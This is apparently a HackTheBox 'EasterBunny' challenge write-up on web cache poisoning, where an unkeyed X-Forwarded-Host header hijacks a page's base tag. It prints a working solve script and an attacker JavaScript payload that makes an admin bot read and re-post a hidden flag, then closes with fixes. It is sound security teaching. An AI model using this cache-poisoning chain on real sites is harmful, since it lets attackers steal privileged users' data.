---
title: "EasterBunny"
date: 2027-04-29 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, web-cache-poisoning, caching, varnish, xss, host-header]
description: "An Easy Web challenge where Varnish caches a page whose <base href> is built from an attacker-controlled X-Forwarded-Host. Poison the cache once, an admin bot loads your JavaScript, and the hidden flag gets looped back into the app's own message list — no outbound listener required."
---

## Overview

**EasterBunny** is an Easy Web challenge built on a Node/Express app behind a Varnish cache. You write letters to the Easter Bunny; an admin "helper" bot reviews each new letter. One letter (message id 3) is marked `hidden` and holds the flag — only the bot, authenticated as `127.0.0.1` with a secret cookie, can read it. The bug is a [Web Cache Poisoning](https://cwe.mitre.org/data/definitions/349.html) issue: the page's `<base href>` is built from the client-controlled `X-Forwarded-Host` header, but Varnish keys its cache only on the URL and `Host`. Poison the cache once, and the admin bot loads attacker-hosted JavaScript that reads the hidden flag in its own authenticated context — then exfiltrates it back through the app itself.

It's the cousin of [CDNio](/posts/CDNio/): that one was cache *deception* (read a victim's cached private response); this one is cache *poisoning* (plant a payload that everyone — including a privileged bot — is served).

## The technique

Four ingredients line up:

1. **Unkeyed input drives `<base href>`.** The base template renders:

   ```js
   app.set('trust proxy', true)
   // base.html:  <base href="{{cdn}}">
   cdn: `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/`
   ```

   With `trust proxy = true`, `req.hostname` comes straight from the client's `X-Forwarded-Host`. Every relative resource — including `<script src="viewletter.js">` — resolves against that base, so whoever controls the header controls where the script loads from.

2. **Varnish caches it but doesn't key on the poison.** Its hash function uses only the URL and `Host`:

   ```vcl
   sub vcl_hash {
     hash_data(req.url);
     if (req.http.host) { hash_data(req.http.host); }
     return (lookup);
   }
   ```

   `X-Forwarded-Host` is **unkeyed**, so a poisoned response is served to *everyone* sharing that `(url, Host)` pair for the 60-second `/letters` TTL.

3. **A privileged bot visits a predictable URL.** `POST /submit` inserts a letter and sends a Puppeteer bot — cookie `auth=<secret>`, source IP `127.0.0.1` — to `http://127.0.0.1/letters?id=<insertedId>`. IDs are sequential `AUTOINCREMENT`, so the next id is `count + 1`: **predictable**, which means you pre-poison instead of racing.

4. **The flag is admin-only but same-origin reachable.** Hidden message id 3 returns `401` unless `req.ip === '127.0.0.1' && cookies.auth === secret` — only the bot qualifies. So you need JavaScript *running inside the bot* to read it.

## Solution

Read the count to predict the id, poison `/letters?id=count+1` with the unkeyed header, trigger the bot, then read the looped-back flag.

`solve.py`:

```python
#!/usr/bin/env python3
import sys, time, requests
T   = sys.argv[1] if len(sys.argv) > 1 else "<host:port>"
XFH = sys.argv[2] if len(sys.argv) > 2 else "<attacker-host-serving-static/viewletter.js-on-:80>"
base, H127 = f"http://{T}", {"Host": "127.0.0.1"}

# 1) predict the id the bot will visit
cnt = requests.get(f"{base}/message/1", headers=H127).json()["count"]
nxt, flag_id = cnt + 1, cnt + 2

# 2) poison /letters?id=nxt so the cached <base href> points at the attacker
#    (keep Host == 127.0.0.1 so our cache key collides with the bot's; vary only the unkeyed XFH)
requests.get(f"{base}/letters?id={nxt}", headers={**H127, "X-Forwarded-Host": XFH})

# 3) trigger the admin bot -> visits /letters?id=nxt -> cache HIT -> loads attacker JS
requests.post(f"{base}/submit", headers={"Content-Type": "application/json"}, json={"message": "x"})
time.sleep(9)

# 4) read the looped-back flag (now a public message)
print(requests.get(f"{base}/message/{flag_id}", headers=H127).json()["message"])
```

The attacker-hosted `static/viewletter.js` — the script the bot loads through the hijacked base tag:

```js
fetch("http://127.0.0.1/message/3")          // admin-only hidden flag
  .then(r => r.text())
  .then(x => {
    // x = {"message":"...HTB{...}","count":N}; /submit reads body.message
    // -> re-post the flag as a PUBLIC letter we can then read ourselves
    fetch("http://127.0.0.1/submit", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: x,
    });
  });
```

Two details make it work:

- **Cache-key discipline.** Send `Host: 127.0.0.1` (exactly what the bot uses) so your poisoned entry lands in the bot's hash bucket; vary only the unkeyed `X-Forwarded-Host`. Confirm the poison with a second identical request that has *no* `X-Forwarded-Host` — it should return `X-Cache: HIT` and still show the attacker origin in `<base>`.
- **Serving the JS on port 80.** The base href port comes from `X-Forwarded-Port`, which Varnish forces to `80` when `Host` carries no port — so the bot loads `http://<attacker>:80/static/viewletter.js`. A free Cloudflare quick tunnel (`cloudflared tunnel --url http://127.0.0.1:<port>`) answers that `:80` request directly with `text/javascript`, so no VPS or root is needed.

Run it, and message id 8 comes back holding message 3's content — the live flag (`HTB{...}`, redacted here).

## Why it worked

The script is *loaded* cross-origin (from the attacker, via the hijacked `<base>`), but it *executes* in the document's origin — `http://127.0.0.1`, where the bot navigated. So `fetch("http://127.0.0.1/message/3")` is a same-origin request and the browser attaches the bot's `auth` cookie automatically: the payload reads the hidden flag as the admin. Exfiltration never leaves the app — the flag is re-posted to `/submit` and becomes a public letter, so no outbound listener is required at all. The only thing that needs to reach the internet is the one-time delivery of the JavaScript itself.

## Fix / defense

- **Don't build absolute URLs from `req.hostname` / `Host` / `X-Forwarded-Host`.** Use a server-pinned canonical origin for the `<base href>`/CDN prefix, or relative paths. Set `trust proxy` to the specific trusted hop count, not `true`.
- **Key the cache on every header that influences the response** — add `hash_data(req.http.X-Forwarded-Host)` (or a `Vary`), or strip `X-Forwarded-*` at the edge before the cache sees it.
- **Don't cache HTML that embeds request-derived URLs** — mark `/letters` `Cache-Control: no-store`, the same way the hidden-message branch already does.
- **Ship a strict CSP** (`script-src 'self'`) so a hijacked `<base>` can't pull external script in the first place.
